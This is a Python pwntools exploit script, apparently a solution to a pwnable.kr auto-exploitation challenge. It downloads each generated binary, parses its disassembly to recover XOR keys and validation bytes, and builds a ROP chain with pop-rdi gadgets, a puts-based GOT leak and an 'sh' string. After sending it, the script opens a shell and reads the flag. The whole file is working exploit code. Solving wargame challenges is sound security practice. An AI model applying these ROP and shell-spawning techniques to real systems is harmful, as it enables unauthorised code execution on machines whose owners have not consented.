#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./binaries/bin1
from pwn import *
import os
import re
from datetime import datetime

# I didn't know about angr and had to bruteforce my solution :)

pid = os.getpid()


def load_binary():
    io.recvuntil(b'wait...\n')
    binary_compressed_encoded = io.recvline(keepends=False)
    print('received binary')

    with open('./tmp', 'w') as tmp_file:
        tmp_file.write(binary_compressed_encoded.decode('utf-8'))


    now = datetime.now()
    formatted_date = now.strftime('%d-%m-%Y--%H:%M:%S')
    binary_name = f'bin-{formatted_date}-{pid}'

    os.system(f'base64 -d ./tmp > ./exploit-binaries/{binary_name}.Z')
    os.system('rm ./tmp')
    os.system(f'uncompress ./exploit-binaries/{binary_name}.Z')
    
    return f'./exploit-binaries/{binary_name}'

def init_main_disassembly():
    global main_disassembly

    search_start_main_str = 'push rbp; mov rbp, rsp; sub rsp, 0x30;'

    for search_address in exe.search(asm(search_start_main_str)):
        main_address = search_address

    for search_address in exe.search(asm('leave; ret;')):
        if search_address > main_address:
            end_main_address = search_address
            break

    main_disassembly = exe.disasm(main_address, end_main_address - main_address)



def find_xor_values():
    global main_disassembly

    xor_values = [int(line.split(' f0 ')[1][:2], 16) for line in main_disassembly.split('\n') if 'xor' in line]

    return xor_values


def find_base_buffer_address():
    global main_disassembly

    for line in main_disassembly.split('\n'):
        if 'movzx' in line and '#' in line:
            base_buffer_address = int(re.split('# *', line)[1], 16)
    
    return base_buffer_address


def encode_payload(payload, xor_even, xor_odd):
    encoded_payload = ''

    for index, value in enumerate(payload):
        encoded_value = value

        if index % 2 == 0:
            encoded_value ^= xor_even
        else:
            encoded_value ^= xor_odd

        encoded_payload += str(hex(encoded_value))[2:].rjust(2, '0')

    return encoded_payload


def format_src(param):
    if param == 'al' or param == 'rax':
        return 'eax'
    if param == 'cl' or param == 'rcx':
        return 'ecx'
    if param == 'dil' or param == 'rdi':
        return 'edi'
    if param == 'rdx' or param == 'dl':
        return 'edx'
    return param


def format_dest(state, param):
    if param.startswith('0x'):
        return int(param, 16)

    try:
        return int(param)
    except:
        pass

    formatted = format_src(param)

    return state[formatted]

def find_values(start_address, end_address):
    global exe

    disassembly = exe.disasm(start_address + 0x8, end_address - (start_address + 0x8)).split('\n')

    cmp_values = [0 if 'BYTE' in line.split(', ')[1] else int(line.split(', ')[1], 16) for line in disassembly if 'cmp' in line]

    state = {
            'eax': 0,
            'edi': cmp_values[0],
            'esi': cmp_values[1],
            'edx': cmp_values[2],
            'ecx': 0,
            'BYTE PTR [rbp-0x4]': 0,
            'BYTE PTR [rbp-0x8]': 0,
            'BYTE PTR [rbp-0xc]': 0
    }

    local1 = local2 = local3 = None

    for line in disassembly:
        if 'mov' in line:
            after_instruction = re.split('mov\w* *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] = value
        elif 'cmp' in line:
            after_instruction = re.split('cmp *', line)[1]
            param1 = after_instruction.split(', ')[0]
            value = state[format_src(param1)]
            number_value = value if value <= 0xff else int(hex(value)[-2:], 16)

            if number_value < 0:
                number_value += 0x100

            if local1 is None:
                local1 = number_value
                state['BYTE PTR [rbp-0x4]'] = value
            elif local2 is None:
                local2 = number_value
                state['BYTE PTR [rbp-0x8]'] = value
            elif local3 is None:
                local3 = number_value
                return [local1, local2, local3]
        elif 'add' in line:
            after_instruction = re.split('add *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] += value
        elif 'sub' in line:
            after_instruction = re.split('sub *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] -= value

            while state[format_src(param1)] < 0:
                    state[format_src(param1)] += 0x100
        elif 'imul' in line:
            after_instruction = re.split('imul *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] *= value
        elif 'shl' in line:
            after_instruction = re.split('shl *', line)[1]
            param1, param2 = after_instruction.split(', ')

            value = format_dest(state, param2)

            state[format_src(param1)] *= (2 ** value)
        elif 'lea' in line:
            after_instruction = re.split('lea *', line)[1]
            param1, param2 = after_instruction.split(', ')

            first, second, last = re.split('[*+]', param2[1:-1])

            value = (format_dest(state, first) * format_dest(state, second) + format_dest(state, last)) if param2.index('+') > param2.index('*') else (format_dest(state, first) + format_dest(state, second) * format_dest(state, last))

            state[format_src(param1)] = value

        elif 'jn' in line:
            continue
        else:
            print('unsupported command ', line)


def int_to_list(num):
    hex_str = hex(num)[2:]
    hex_str = hex_str.rjust(16, '0')
    l = []

    for i in range(len(hex_str) - 2, -1, -2):
        l.append(int(hex_str[i:i+2], 16))

    return l

io = None
exe = None
current_binary_name = None
main_disassembly = None


def exploit():
    global io
    global exe
    global current_binary_name
    global main_disassembly

    io = remote('pwnable.kr', 9005)

    current_binary_name = load_binary()
    # Set up pwntools for the correct architecture
    exe = context.binary = ELF(current_binary_name, checksec=False)

    init_main_disassembly()

    xor_values = find_xor_values()

    [xor_even, xor_odd] = xor_values

    base_buffer_address = find_base_buffer_address()

    function_calls_in_main = [line for line in main_disassembly.split('\n') if 'call' in line]
    first_validation_function_address = int(function_calls_in_main[-2].split(' ')[-1], 16)

    authentication_values = []
    next_validation_function_address = first_validation_function_address

    for i in range(16):
        for line in exe.disasm(next_validation_function_address, 1000).split('\n'):
            if 'ret' in line:
                end_validation_function_address = int(line.split(':')[0][1:], 16)
                break

        validation_values = find_values(next_validation_function_address, end_validation_function_address)
        print(validation_values)
        authentication_values.extend(validation_values)

        for line in exe.disasm(next_validation_function_address, end_validation_function_address - next_validation_function_address).split('\n'):
            if 'call' in line:
                next_validation_function_address = int(re.split('call *', line)[1], 16)
                break

    win_address = next_validation_function_address

    for search_address in exe.search(asm('ret;')):
        if search_address > win_address:
            end_win_address = search_address
            break

    win_buffer_size = 0
    for line in exe.disasm(win_address, end_win_address - win_address).split('\n'):
        if 'sub    rsp' in line:
            win_buffer_size = int(line.split(', ')[1], 16)
            break

    rop = ROP(exe)

    pop_rdi_ret_gadget = int_to_list(rop.find_gadget(['pop rdi', 'ret']).address)
    ret_gadget = int_to_list(rop.find_gadget(['ret']).address)

    srand_got_offset = int_to_list(exe.symbols['got.srand'])
    puts_plt_address = int_to_list(exe.symbols['plt.puts'])
    sh = [0x73, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
    sh_address = int_to_list(base_buffer_address + 0x30 + 69 * 8 + 8)

    additional_buffer_padding = ret_gadget * (win_buffer_size // 8)

    sh_address = int_to_list(base_buffer_address + 0x30 + ((win_buffer_size // 8) * 8) + 60 * 8 + 8)

    payload = additional_buffer_padding + 60 * ret_gadget + \
        pop_rdi_ret_gadget + sh + \
        3 * ret_gadget + \
        pop_rdi_ret_gadget + sh_address + puts_plt_address + \
        pop_rdi_ret_gadget + srand_got_offset + puts_plt_address + \
        pop_rdi_ret_gadget + sh_address + [0xa0, 0x53, 0xb8]

    values = authentication_values + payload

    inputt = encode_payload(values, xor_even, xor_odd)


    io.recvline()
    io.sendlineafter(b'hurry up!', bytes(inputt, 'utf-8'))
    io.recvline()
    
    res = io.recvline()

    if res.startswith(b'Segmentation'):
        print('segfaulted, trying one more time')
        return
    
    if res.startswith(b'Illegal'):
        print('illegal instruction, trying one more time')
        return

    print(io.recv())
    io.sendline(b'cat ./flag')
    io.interactive()
    try:
        sleep(1)
        io.clean()
        io.sendline(b'cat ./flag')
        print(io.recvline())
        print('result ^^^^^^')
    except Exception as e:
        print(repr(e))
        print('failure at ^^^^^^')

    return 1


while True:
    try:
        result = exploit()
        
        if result == 1:
            print('finished')
            break
    except Exception as e:
        print(e)
    
    try:
        io.close()

        if current_binary_name is not None and os.path.exists(current_binary_name):
            os.remove(current_binary_name)
    except Exception as e:
        print(e)


